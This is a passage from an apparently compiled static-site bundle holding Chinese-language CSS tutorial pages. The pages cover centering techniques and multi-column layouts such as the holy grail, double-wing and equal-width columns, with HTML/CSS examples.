</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n还可以将子元素替换为table，因为table也是具有块级性质的。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix {\n            width: 600px;\n            border: 1px solid red;\n        }\n        .parent {\n            /* 具有块级性质 */\n            display: table;\n            width: 300px;\n            /* 让parent也就是表格居中 */\n            margin: 0 auto;\n        }\n        /* 其他内容只能写到parent内部了，其他内容其实就是单元格了 */\n        .col1, .col2, .col3 { display: table-cell; width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col1"></div>\n            <div class="col2"></div>\n            <div class="col3"></div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 2.1.3 绝对定位+位移变换\n\n该方法的核心就是使用绝对定位将子元素的位置居中，但不是子元素中心点居中了，那就需要使用transform: translatex(-50%);进行调整。\n\n该方法优点是，还算比较简单，缺点就是开启了相对定位以及绝对定位，绝对定位脱离了文档流，也只能对一个元素进行水平居中布局。相比于text-align: center+display: inline-block这种方法，会多套一层元素。其实你要是知道各自的宽度和间隔，也不是不能减少一层元素，只是计算比较麻烦没有灵活性。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix {\n            position: relative;\n            width: 600px;\n            height: 100px;\n            border: 1px solid red;\n        }\n        .parent {\n            position: absolute;\n            width: 310px;\n            /*从左往右偏移父元素宽度的50%*/\n            left: 50%;\n            /*左移调整，数值是自身宽度的50%*/\n            transform: translatex(-50%);\n        }\n        /*其他内容只能写到parent内部了*/\n        .col1, .col2, .col3 { display: inline-block; width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col1"></div>\n            <div class="col2"></div>\n            <div class="col3"></div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 2.2 垂直居中\n\n垂直居中意思是让子元素在父容器内部垂直方向上是居中显示的。\n\n# 2.2.1 使用vertical-align\n\n使用vertical-align需要回顾一下vertical-align和文字垂直对齐。\n\nvertical-align是直接设置在内联元素或者单元格上的，并且这两种情况还有区别。设置在内联元素上，是让内联元素本身相对于line box进行垂直对齐的。而设置在单元格上，是让单元格内部内容相对于单元格这个容器进行垂直对齐的。\n\n这里我们使用“设置在单元格上”这个方式。优点就是能对多个子元素在一列上进行垂直居中布局的。缺点的话其实还好，子元素同级要使用文本时也是居中的，其实文本直接用div包裹起来就行了，不算是什么问题吧。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            display: table-cell;\n            vertical-align: middle;\n            width: 100px;\n            height: 500px;\n            border: 1px solid red;\n        }\n        .col1, .col2, .col3 { width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 2.2.2 绝对定位+位移变换\n\n跟水平居中的第三种方案一样，使用绝对定位将子元素的位置居中，再使用transform: translatey(-50%);进行调整\n\n该方法优点是，还算比较简单，子元素同级的文本不受到影响。缺点就是开启了相对定位以及绝对定位，绝对定位脱离了文档流，也只能对一个元素进行水平居中布局。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix {\n            position: relative;\n            width: 100px;\n            height: 500px;\n            border: 1px solid red;\n        }\n        .parent {\n            position: absolute;\n            width: 100px;\n            /*从左往右偏移父元素宽度的50%*/\n            top: 50%;\n            /*左移调整，数值是自身宽度的50%*/\n            transform: translatey(-50%);\n        }\n        /*其他内容只能写到parent内部了*/\n        .col1, .col2, .col3 { width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col1"></div>\n            <div class="col2"></div>\n            <div class="col3"></div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n# 2.2.3 绝对定位+auto外边距\n\n其实这各方案也能在水平居中里使用的，核心就是利用定位元素的隐藏等式来让元素进行居中的，当然你还得熟悉auto。\n\n具体等式是这样的：\ntop + margin-top + border-top-height + padding-top + height + padding-bottom + border-bottom-height + margin-bottom + bottom = the height of the containing block\n\n因为包含块的高度就是父级元素的高度，让子元素高度显示设置，然后让top和bottom都设置为0，内边距和边框可以不同设置，最后让上下外边距为auto。css就会按照上面的的等式以及刚刚设置的其他值，为外边距自动分配数值，这样就达到了一个垂直居中的效果。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix {\n            position: relative;\n            width: 100px;\n            height: 500px;\n            border: 1px solid red;\n        }\n        .parent {\n            position: absolute;\n            width: 100px;\n            height: 300px;\n            top: 0;\n            bottom: 0;\n            margin: auto 0;\n        }\n        /*其他内容只能写到parent内部了*/\n        .col1, .col2, .col3 { width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col1"></div>\n            <div class="col2"></div>\n            <div class="col3"></div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 2.3 水平+垂直居中\n\n# 2.3.1 使用单元格\n\n其实就是单元格内的对齐，也就是使用text-align加上vertical-align，可以同时设置在单元格上，因为单元格可以视为块级元素，所以可以使用text-align，而vertical-align本来就有一个特殊场景使用在单元格上。当然子元素得是inline-block，不然满足不了两者。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            display: table-cell;\n            width: 400px;\n            height: 400px;\n            text-align: center;\n            vertical-align: middle;\n            border: 1px solid red;\n        }\n        .inner {\n            display: inline-block;\n            width: 200px;\n            height: 200px;\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner">\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# 2.3.2 vertical-align+auto外边距\n\n这个方法其实就是对上一种方案的改进，不使用inline-block，直接让块级元素的外边距为auto。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            display: table-cell;\n            width: 400px;\n            height: 400px;\n            text-align: center;\n            vertical-align: middle;\n            border: 1px solid red;\n        }\n        .inner {\n            width: 200px;\n            height: 200px;\n            margin: 0 auto;\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner">\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上两种方法都使用了单元格，如果.outer的width设置为100%，水平居中就失效了。原因就是表宽计算问题，此时表就一个单元格，内容大概是200px，并且还设置单元格width: 100%。css就会认为你这一列的列宽是200 / 100% = 200px，只有一列那么总列宽就是200px，又因为表没有显式设置宽度，那么总列宽会作为最终的表宽也就是200px，这样就导致水平居中失效了。\n\n解决办法是，在单元格外加一个div并设置display: table; width: 100%;，代码如下\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            display: table;\n            width: 100%;\n        }\n        .outer {\n            display: table-cell;\n            width: 100%;\n            height: 400px;\n            text-align: center;\n            vertical-align: middle;\n            border: 1px solid red;\n        }\n        .inner {\n            display: inline-block;\n            width: 200px;\n            height: 200px;\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="outer">\n            <div class="inner">\n            </div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# 2.3.3 绝对定位+位移变换\n\n利用绝对定位和top、left进行偏移，然后使用transform进行调整。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer {\n        position: relative;\n        width: 400px;\n        height: 400px;\n        border: 1px solid red;\n    }\n    .inner {\n        position: absolute;\n        width: 200px;\n        height: 200px;\n        top: 50%;\n        left: 50%;\n        transform: translate(-50%, -50%);\n        background-color: blue;\n    }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# 2.3.4 绝对定位+auto外边距\n\n该方案核心就是利用定位元素的隐藏等式来让元素进行居中的，当然你还得熟悉auto。\n\n定位元素的水平方向： left + margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right + right = the width of the containing block\n\n定位元素的垂直方向： top + margin-top + border-top-height + padding-top + height + padding-bottom + border-bottom-height + margin-bottom + bottom = the height of the containing block\n\n<html>\n<head>\n    <style type="text/css">\n    .outer {\n        position: relative;\n        width: 400px;\n        height: 400px;\n        border: 1px solid red;\n    }\n    .inner {\n        position: absolute;\n        width: 200px;\n        height: 200px;\n        top: 0;\n        left: 0;\n        bottom: 0;\n        right: 0;\n        margin: auto;\n        background-color: blue;\n    }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n',charsets:{cjk:!0}},{title:"7.多列布局",frontmatter:{title:"7.多列布局"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/7.%E5%A4%9A%E5%88%97%E5%B8%83%E5%B1%80.html",relativePath:"book-web/html、css、js、ts/学习CSS/7.多列布局.md",key:"v-0671b2bb",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/7.%E5%A4%9A%E5%88%97%E5%B8%83%E5%B1%80.html",headers:[{level:2,title:"一、什么是多列布局",slug:"一、什么是多列布局",normalizedTitle:"一、什么是多列布局",charIndex:11},{level:2,title:"二、两列布局",slug:"二、两列布局",normalizedTitle:"二、两列布局",charIndex:231},{level:3,title:"2.1 float + calc()",slug:"_2-1-float-calc",normalizedTitle:"2.1 float + calc()",charIndex:322},{level:3,title:"2.2 float + BFC",slug:"_2-2-float-bfc",normalizedTitle:"2.2 float + bfc",charIndex:1582},{level:3,title:"2.3 使用table表格",slug:"_2-3-使用table表格",normalizedTitle:"2.3 使用table表格",charIndex:2078},{level:2,title:"三、三列布局",slug:"三、三列布局",normalizedTitle:"三、三列布局",charIndex:2761},{level:3,title:"3.1 经典的圣杯布局",slug:"_3-1-经典的圣杯布局",normalizedTitle:"3.1 经典的圣杯布局",charIndex:2861},{level:3,title:"3.2 双飞翼布局",slug:"_3-2-双飞翼布局",normalizedTitle:"3.2 双飞翼布局",charIndex:5520},{level:3,title:"3.3 圣杯的其他实现",slug:"_3-3-圣杯的其他实现",normalizedTitle:"3.3 圣杯的其他实现",charIndex:6639},{level:2,title:"四、等分布局",slug:"四、等分布局",normalizedTitle:"四、等分布局",charIndex:8418},{level:3,title:"4.1 使用浮动或表格",slug:"_4-1-使用浮动或表格",normalizedTitle:"4.1 使用浮动或表格",charIndex:8470},{level:3,title:"4.2 空白间隔问题",slug:"_4-2-空白间隔问题",normalizedTitle:"4.2 空白间隔问题",charIndex:9812},{level:2,title:"五、等高布局",slug:"五、等高布局",normalizedTitle:"五、等高布局",charIndex:14729},{level:3,title:"5.1 使用表格",slug:"_5-1-使用表格",normalizedTitle:"5.1 使用表格",charIndex:14789},{level:3,title:"5.2 溢出配合边距",slug:"_5-2-溢出配合边距",normalizedTitle:"5.2 溢出配合边距",charIndex:15699},{level:2,title:"六、css3中的多列布局",slug:"六、css3中的多列布局",normalizedTitle:"六、css3中的多列布局",charIndex:17168},{level:3,title:"6.1 列数和最小宽度",slug:"_6-1-列数和最小宽度",normalizedTitle:"6.1 列数和最小宽度",charIndex:17185},{level:3,title:"6.2 空白间隔、间隔边框",slug:"_6-2-空白间隔、间隔边框",normalizedTitle:"6.2 空白间隔、间隔边框",charIndex:18068},{level:3,title:"6.3 横跨所有列",slug:"_6-3-横跨所有列",normalizedTitle:"6.3 横跨所有列",charIndex:19650},{level:2,title:"七、全屏布局",slug:"七、全屏布局",normalizedTitle:"七、全屏布局",charIndex:20534}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、什么是多列布局 二、两列布局 2.1 float + calc() 2.2 float + BFC 2.3 使用table表格 三、三列布局 3.1 经典的圣杯布局 3.2 双飞翼布局 3.3 圣杯的其他实现 四、等分布局 4.1 使用浮动或表格 4.2 空白间隔问题 五、等高布局 5.1 使用表格 5.2 溢出配合边距 六、css3中的多列布局 6.1 列数和最小宽度 6.2 空白间隔、间隔边框 6.3 横跨所有列 七、全屏布局",content:'# 多列布局\n\n\n# 一、什么是多列布局\n\n多列布局会把内容按列排序的方式进行布局，就像文本在报纸上的排列那样。\n\n多列布局的分类，大概分为两列布局、三列布局和等分等高布局。像两列布局和三列布局，列可采用定宽或者自适应，两列布局还好情况不复杂（左列定宽右列自适应），但是三列情况就多一些了。\n\n三列布局中，如果左边两个是定宽右边那个是自适应，这个情况跟两列布局类似；如果左右两边是定宽而中间那个是自适应，这就有些复杂了，还会衍生出圣杯布局和双飞翼布局。\n\n\n# 二、两列布局\n\n\n\n两列布局一般情况是左列定宽右列自适应，它的实现方式有三种：\n\n * float + calc()\n * float + BFC\n * 使用table表格\n\n\n# 2.1 float + calc()\n\n其实float + calc()这种实现方式的前身是float + margin，因为calc()这个方法是css3推出的，在css3之前是使用边距和auto宽度来控制自适应列的展示的。\n\n左列设置左浮动，这样后面的元素与左列会在同一行（浮动效果）从而形成两列；左列设置固定宽度，右列自适应并且不能被左列遮挡，需要设置左边距，宽度其实不用设置（宽度加上左边距等于一行，块级元素特性）。\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right { height: 200px; }\n        .left { float: left; width: 300px; background-color: red; }\n        .right { margin-left: 300px; background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    \x3c!--左列，左浮动，固定宽度--\x3e\n    <div class="left"></div>\n    \x3c!--右列，自适应宽度，设置好左边距--\x3e\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n如果右列的某个后代元素使用了清除浮动，这个后代元素会单独去新的一行里显示，这就破坏了两列布局。为什么会去新的一行里显示，可以回顾一下清除浮动这一章节。另外一个问题是，一个浮动另一个不浮动，层级上有问题，并且这两个之间可能会留出空隙来（老版浏览器）。\n\n为了解决上面的问题，可以直接让右列也浮动起来，右列宽度直接使用css3里的calc()来计算，右列宽度 = 100% - 左列宽度。\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right { height: 200px; }\n        .left { float: left; width: 300px; background-color: red; }\n        .right { float: right; width: calc(100% - 300px); background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    \x3c!--左列，左浮动，固定宽度--\x3e\n    <div class="left"></div>\n    \x3c!--右列，右浮动（左浮动也可以），calc()来自适应--\x3e\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 2.2 float + BFC\n\n其实就是BFC的作用之一，BFC不会被浮动区域覆盖。float + BFC这个方案优点就是简单，但是留下的问题就是一个不浮动另一个不浮动，不过问题不大。\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right { height: 200px; }\n        .left { float: left; width: 300px; background-color: red; }\n        /*display: flow-root会创建无副作用的BFC*/\n        .right { display: flow-root; background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    <div class="left"></div>\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 2.3 使用table表格\n\n对非<table>元素使用表格布局，来达到两列布局的效果。需要注意的点就是，采用100%宽度的固定宽度布局，再加上两个div，其中一个div是固定宽度，另一个不设置宽度，它会由总表宽减去已有宽度（左列的固定宽度）得到。这种两列布局，兼容性不错，就是得熟悉表格布局（边界模式和宽度计算方式）。\n\n<html>\n<head>\n    <style type="text/css">\n        /*表格布局，固定宽度，宽度设置页面的100%*/\n        .parent { display: table; table-layout: fixed; width: 100%; }\n        .left, .right { height: 200px; }\n        .left { display: table-cell; width: 300px; background-color: red; }\n        .right { display: table-cell; background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n      <div class="left"></div>\n      <div class="right"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 三、三列布局\n\n\n\n三列布局有一种情况是，左边两个是定宽右边那个是自适应，它的实现方式与两列布局基本一致，所以不再这一节里赘述了。\n\n三列布局另一种情况是，左右两边是定宽而中间那个是自适应。\n\n\n# 3.1 经典的圣杯布局\n\n圣杯布局是头部、中间内容和底部构成，而这个最重要的中间内容就是一个三列布局，并且是左右两边是定宽而中间那个是自适应的情况。\n\n\n\n在css3之前常使用float + margin来实现，你可能会写成这个样子：\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right, .center { height: 200px; }\n        .left { float: left; width: 300px; background-color: red; }\n        .center { margin-left: 300px; margin-right: 300px; background-color: #cccccc; }\n        .right { float: right; width: 300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="left"></div>\n    <div class="center"></div>\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n对应效果图：\n\n\n什么原因呢？可以想一下right这个div在没有浮动前处于什么位置？是不是在center这个div的下边界那里（块级元素特性）？再根据浮动规则的其中一条“浮动元素的顶边不能比它原本未浮动前所在框体顶边还高”，现在你明白了怎么回事吧！\n\n有一个解决办法就是把right这个div和center这个div的代码位置交换一下，但是代码阅读体验不好，并且还可能会影响搜索引擎对网页的收录。还有个解决办法就是把center这个div放到最前面，左右两个浮动div再使用相对定位。\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right, .center { height: 200px; }\n        .center { margin-left: 300px; margin-right: 300px; background-color: #cccccc; }\n        .left { float: left; position: relative; bottom: 200px;  width: 300px; background-color: red; }\n        .right { float: right; position: relative; bottom: 200px; width: 300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="center"></div>\n    <div class="left"></div>\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n其实可以使用经典的解决方案，center这个div还是放到最前面，在让这三个div都浮动，利用“margin为负值”将左右两个div提上来。因为让center这个div也浮动了（块级元素变为浮动元素），那么它的自适应宽度失效了（没法使用某一边的外边距了），那么就需要添加一个父级div（父级的边界或者内边距可以约束子级浮动元素）。\n\n<html>\n<head>\n    <style type="text/css">\n        /* 设置父级BFC的原因是需要包含子级浮动的高度 */\n        .parent { display: flow-root; padding-left: 300px; padding-right: 300px }\n        .left, .right, .center { height: 200px; }\n        .center { float: left; width:100%; background-color: #cccccc; }\n        .left {  width: 300px; float: left; margin-left: -300px; position: relative; right: 100%; background-color: red; }\n        /*比较有趣的一点，.right设置float: left或float: right，效果一样*/\n        .right { width: 300px; float: left; margin-right: -300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent">\x3c!--子元素都浮动，那就需要这个父级元素，最好设置成BFC--\x3e\n        <div class="center"></div>\n        <div class="left"></div>\n        <div class="right"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n这个解决方案的重点就在于margin-left: -300px或者margin-right: -300px这种负值外边距的使用，它对浮动的影响可以查看之前的边距对浮动的影响。\n\n还有要注意的一点，并没有使用margin-left: 100%，因为考虑到center区域比left区域宽度小的话，left这个浮动元素就回不到上一行了；并且它并不需要min-width的限制。最后要注意的一点就是，左右两列回到上一行后，左列还在center区域的右边界，需要使用相对定位将它定位到左边空处。\n\n\n# 3.2 双飞翼布局\n\n双飞翼布局是对经典圣杯布局的一种优化，最主要的优化就是去掉了相对定位，并且将父级元素的contentArea宽度设置为100%（肯定比左右两列之和要大），这样就能避免类似于margin-left: 100%的问题（上一节说过），所以双飞翼可以直接使用margin-left: 100%来对左列设置位置。\n\n<html>\n<head>\n    <style type="text/css">\n        /* 设置父级BFC的原因是需要包含子级浮动的高度 */\n        .parent { display: flow-root; }\n        .left, .right, .center, .inner { height: 200px; }\n        .center { float: left; width:100%; background-color: #cccccc; }\n        .inner { margin-left: 300px; margin-right: 300px; background-color: green; }\n        .left {  width: 300px; float: left; margin-left: -100%; background-color: red; }\n        /*比较有趣的一点，.right设置float: left或float: right，效果一样*/\n        .right { width: 300px; float: left; margin-left: -300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent">\x3c!--子元素都浮动，那就需要这个父级元素，最好设置成BFC--\x3e\n        <div class="center">\n            <div class="inner"></div>\n        </div>\n        <div class="left"></div>\n        <div class="right"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n不过双飞翼有个问题，当浏览器缩小的比左右两列之和还小时，右列会覆盖左列（可以加上min-width限制）。\n\n\n# 3.3 圣杯的其他实现\n\n我们使用**float + calc()**来实现看看：\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right, .center { height: 200px; float: left; }\n        .left { width: 300px; background-color: red; }\n        .center { width: calc(100% - 600px); background-color: #cccccc; }\n        .right { width: 300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="left"></div>\n    <div class="center"></div>\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n如果使用float + BFC呢？其实跟float + margin类似，问题也一样，需要交换right这个div和center这个div的代码位置。\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right, .center { height: 200px; }\n        .left { float: left; width: 300px; background-color: red; }\n        .center { display: flow-root; background-color: #cccccc; }\n        .right { float: right; width: 300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="left"></div>\n    <div class="right"></div>\n    <div class="center"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n前两种都有双飞翼布局类似的问题，当浏览器缩小的比左右两列之和还小时，右列会跑到新行去（可以加上min-width限制）。\n\n使用table表格的话，跟两列布局没什么区别，也不会出现什么问题。\n\n<html>\n<head>\n    <style type="text/css">\n        /*表格布局，固定宽度，宽度设置页面的100%*/\n        .parent { display: table; table-layout: fixed; width: 100%; }\n        .left, .right, .center { height: 200px; }\n        .left { display: table-cell; width: 300px; background-color: red; }\n        .right { display: table-cell; width: 300px; background-color: blue; }\n        .center { background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n      <div class="left"></div>\n      <div class="center"></div>\n      <div class="right"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 四、等分布局\n\n等分布局把一行分成若干列，这些列的宽度都相等。它的实现一般有两种：浮动和表格。\n\n\n# 4.1 使用浮动或表格\n\n4个都向左浮动，分配的宽度为25%\n\n<html>\n<head>\n    <style type="text/css">\n        .parent { display: flow-root; }\n        .col { float: left; width: 25%; height: 200px; }\n        .cell1 { background-color: red; }\n        .cell2 { background-color: yellow; }\n        .cell3 { background-color: blue; }\n        .cell4 { background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n      <div class="col cell1"></div>\n      <div class="col cell2"></div>\n      <div class="col cell3"></div>\n      <div class="col cell4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n表格的话，设置父元素为display: table，4个子元素为display: table-cell，表要记得设置宽度。\n\n<html>\n<head>\n    <style type="text/css">\n        /*表格布局，固定宽度，宽度设置页面的100%*/\n        .parent { display: table; table-layout: fixed; width: 100%; }\n        .col { display: table-cell; height: 200px }\n        .cell1 { background-color: red; }\n        .cell2 { background-color: yellow; }\n        .cell3 { background-color: blue; }\n        .cell4 { background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n      <div class="col cell1"></div>\n      <div class="col cell2"></div>\n      <div class="col cell3"></div>\n      <div class="col cell4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 4.2 空白间隔问题\n\n\n\n可能会遇到间隔问题，如上图。而空白间隔应该要比展示列多一个或者少一个，表格方式的倒还好（分离边界模型），主要是浮动方式修改起来有些麻烦。浮动方式修改，比较笨的解决办法是，使用空白div块来作为空白间隔；另外一种，让边距充当空白间隔，然后对多出或者缺少的空白间隔进行特殊处理。\n\n\n\n\n边距充当空白间隔的问题和解决方案：\n\n 1. 如果对子级元素使用外边距充当空白间隔，按百分比分配宽度时就需要考虑外边距了。外边距没考虑好，浮动元素可能会跳到下一行去了。其实可以使用box-sizing: border-box将子级元素改为IE盒模型，内边距被包含在宽度中了，让内边距作为空白间隔，这就不会影响宽度分配了。\n 2. 但是空白间隔的多出或者缺少没有解决。子级元素的宽度分配是依赖于父级元素的，如果让父级元素设置内边距，或许可以增加一个空白间隔，但是无法抵消一个空白间隔（内边距不能为负数）。再者，我们希望空白间隔也是用百分比，子级元素倒好说，但是父级设置边距用百分比是没有参考对象。那么，综合这两个问题，可以引入一个祖父元素，对父级元素设置外边距使用百分比，这就可以增加或抵消一个空白间隔了。\n 3. 最后一个问题是，父级元素设置外边距的百分比数值，与子元素设置内边距的百分比数值，这两者之间有没有联系？答案是有的，下面我们来分析一下。\n\n\n\n我们假设，祖父元素宽度为A，父级元素宽度为B，父级元素设置外边距的百分比数值为x，子元素设置内边距的百分比数值为y。它们有什么联系呢？联系就在于在最后一个空白区域，这个空白区域的宽度等于B * y，也等于A - B这个差值，这个差值其实就是父级元素设置外边距来额外添加的一个空白间隔，因为父级元素设置了这一个外边距，那么1 - x = B / A。\n\n将这两个等式联合起来可以消掉A和B，最后可以得到x = y / (y + 1)。我们看下面这个代码，子元素设置内边距的百分比数值为5%，根据前面这个结论式子，可以算出父级元素设置外边距的百分比数值为4.762%。并且这个式子的关系，不会受等分数量还有祖父宽度的影响\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix { border: 1px solid red; width: 600px; }\n        .parent { display: flow-root; margin-right: 4.762%; } /*是margin-right，因为要在最右边添加一个空白间隔*/\n        .col { float: left; box-sizing: border-box; width: 20%; padding-left: 5%; }\n        .cell1 { height: 100px; background-color: red; }\n        .cell2 { height: 100px; background-color: yellow; }\n        .cell3 { height: 100px; background-color: blue; }\n        .cell4 { height: 100px; background-color: green; }\n        .cell5 { height: 100px; background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col">\n                <div class="cell1"></div>\n            </div>\n            <div class="col">\n                <div class="cell2"></div>\n            </div>\n            <div class="col">\n                <div class="cell3"></div>\n            </div>\n            <div class="col">\n                <div class="cell4"></div>\n            </div>\n            <div class="col">\n                <div class="cell5"></div>\n            </div>\n        </div>\n    